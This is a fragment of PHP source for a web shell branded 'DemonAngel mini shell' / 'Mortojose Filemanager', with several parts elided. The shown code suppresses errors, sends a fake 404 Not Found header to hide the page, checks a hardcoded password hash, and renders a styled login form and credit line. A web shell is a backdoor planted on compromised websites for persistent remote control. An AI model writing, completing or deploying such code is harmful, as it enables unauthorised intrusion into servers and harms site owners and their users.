...
// Forbidden 403 Shell | DemonAngell

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "05348845d59e777f390526212cb139e3";
$link = "hmm.txt";
...
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:red;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;"></font></center>
          <br>      
      <input type="password" name="password" placeholder="demoangell@gmail.com">
      <input type="submit" value="LOGIN">
      
      <br>

<h1><font class="Skranji" style="color:white;font-family:'Kelly Slab';font-size: 15px;">DemonANGEL <font color="red">MINI SHELL</h1>
      <br>
...
?>
<!DOCTYPE html><html><head><link href="" rel="stylesheet" type="text/css"><title>Mortojose Filemanager</title>
...
echo'<br><center>&copy; 2021 - <a href="https://ganestseven.com/">DemonAngel</a>.</center><br>';?>
